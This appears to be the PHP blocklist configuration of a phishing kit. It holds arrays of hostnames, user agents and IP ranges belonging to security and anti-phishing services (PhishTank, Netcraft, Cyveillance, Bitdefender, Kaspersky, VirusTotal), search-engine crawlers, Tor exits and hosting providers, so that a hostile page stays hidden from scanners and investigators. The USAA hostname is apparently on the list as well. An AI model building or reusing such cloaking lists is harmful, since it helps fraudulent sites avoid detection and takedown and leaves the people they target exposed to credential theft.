<?php
$blocked_countries = array(
	"XX",
	"YY",
	"ZZ"
	);


$blocked_browsers = array(
	""
	);



$blocked_hostnames = array(
     "above",
     "google",
     "google-proxy",
     "softlayer",
	 "amazonaws",
	 "cyveillance",
	 "phishtank",
	 "dreamhost",
	 "netpilot",
	 "calyxinstitute",
	 "tor-exit",
	 "netcraft",
	 "googleusercontent",
	 "coldhak",
	 "filterocean",
	 "bitdefender",
	 "Digital Ocean",
	 "Digitalocean",
	 "Kaspersky",
	 "avast",
	 "bluecoat",
	 "Blue Coat",
	 "amazon.com",
	 "MX Logic",
	 "mxlogic",
	 "calpop.com",
	 "Multacom",
	 "he.net",
	 "Hurricane Electric",
	 "bezeqint",
	 "Bezeq",
	 "appnexus",
	 "Cyber Wurx",
	 "Cybercon",
	 "Cogent",
	 "qtsnet.com",
	 "USAA",
	 "comverse",
	 "omnicohosting",
	 "NCServ",
	 "DataPipe",
	 "hosting",
	 "Mifril",
	 "anti",
	 "slicehost",
	 "security",
);

$blocked_referers = array(
	"1"
	);

$blocked_useragents = array(
	"python-requests",
	"python",
	"Railgun",
	"GetURLInfo",
	"InfoPath",
	"Netscape",
	"Scrapy",
	"scrapy",
	"curl",
	"PhantomJS",
	"Unknown",
	"virustotalcloud",
	"AppEngine-Google",
	"Lynx",
	"GTB7",
	);

$banned_ips = array(
	"^95.85.*.*",
	"^46.101.*.*",
	"^92.103.*.*",
	"^62.67.194.*",
	"^91.231.212.*",
	"^199.116.169.*",
	"^199.91.135.*",
	"^199.19.249.*",
	"^91.113.66.*",
	"^192.160.102.*",
	"^104.131.*.*",
	"^66.102.*.*",
	"^107.170.*.*",
	"^149.20.*.*",
	"^74.125.*.*", 
	"^66.150.14.*",
	"^54.176.*.*",
	"^66.249.*.*",
	"^72.14.192.*",
	"^208.65.144.*",
	"^74.125.*.*",
	"^209.85.128.*",
	"^216.239.32.*",
	"^74.125.*.*",
	"^207.126.144.*",
	"^173.194.*.*",
	"^64.233.160.*",
	"^72.14.192.*",
	"^66.102.*.*",
	"^64.18.*.*",
	"^62.116.207.*",
	"^69.65.*.*",
	"^50.7.*.*",
	"^46.116.*.* ",
	"^62.90.*.*",
	"^89.138.*.*",
	"^82.166.*.*",
	"^85.64.*.*",
	"^85.250.*.*",
	"^89.138.*.*",
	"^93.172.*.*",
	"^109.186.*.*",
	"^194.90.*.*",
	"^212.29.192.*",
	"^212.29.224.*",
	"^212.143.*.*",
	"^212.150.*.*",
	"^212.235.*.*",
	"^217.132.*.*",
	"^50.97.*.*",
	"^217.132.*.*",
	"^209.85.*.*",
	"^66.205.64.*",
	"^204.14.48.*",
	"^64.27.2.*",
	"^67.15.*.*",
	"^64.62.136.*",
	"^66.221.*.*",
	"^64.62.175.*", 
	"^198.54.*.*",
	"^192.115.134.*",
	"^216.252.167.*",
	"^69.61.12.*",
	"^64.37.103.*",
	"^38.144.36.*",
	"^64.124.14.*",
	"^206.28.72.*",
	"^209.73.228.*",
	"^167.24.*.*",
	"^192.118.48.*",
	"^67.209.128.*",
	"^12.148.209.*",
	"^12.148.196.*",
	"^198.25.*.*",
	"^64.106.213.*"
	);


/*
	 // Example
	 $blocked_countries = array(
     "","AP","EU","AD","AE","AF","AG","AI","AL","AM","CW",
	"AO","AQ","AR","AS","AT","AU","AW","AZ","BA","BB",
	"BD","BE","BF","BG","BH","BI","BJ","BM","BN","BO",
	"BR","BS","BT","BV","BW","BY","BZ","CA","CC","CD",
	"CF","CG","CH","CI","CK","CL","CM","CN","CO","CR",
	"CU","CV","CX","CY","CZ","DE","DJ","DK","DM","DO",
	"DZ","EC","EE","EG","EH","ER","ES","ET","FI","FJ",
	"FK","FM","FO","FR","SX","GA","GB","GD","GE","GF",
	"GH","GI","GL","GM","GN","GP","GQ","GR","GS","GT",
	"GU","GW","GY","HK","HM","HN","HR","HT","HU","ID",
	"IE","IL","IN","IO","IQ","IR","IS","IT","JM","JO",
	"JP","KE","KG","KH","KI","KM","KN","KP","KR","KW",
	"KY","KZ","LA","LB","LC","LI","LK","LR","LS","LT",
	"LU","LV","LY","MA","MC","MD","MG","MH","MK","ML",
	"MM","MN","MO","MP","MQ","MR","MS","MT","MU","MV",
	"MW","MX","MY","MZ","NA","NC","NE","NF","NG","NI",
	"NL","NO","NP","NR","NU","NZ","OM","PA","PE","PF",
	"PG","PH","PK","PL","PM","PN","PR","PS","PT","PW",
	"PY","QA","RE","RO","RU","RW","SA","SB","SC","SD",
	"SE","SG","SH","SI","SJ","SK","SL","SM","SN","SO",
	"SR","ST","SV","SY","SZ","TC","TD","TF","TG","TH",
	"TJ","TK","TM","TN","TO","TL","TR","TT","TV","TW",
	"TZ","UA","UG","UM","US","UY","UZ","VA","VC","VE",
	"VG","VI","VN","VU","WF","WS","YE","YT","RS","ZA",
	"ZM","ME","ZW","A1","A2","O1","AX","GG","IM","JE",
  "BL","MF", "BQ");
*/


/* Example
	$blocked_browsers = array(
	"Chrome",
	"Firefox",
	"Opera",
	"Safari",
	"MSIE" // Internet Explorer
	);
*/

?>


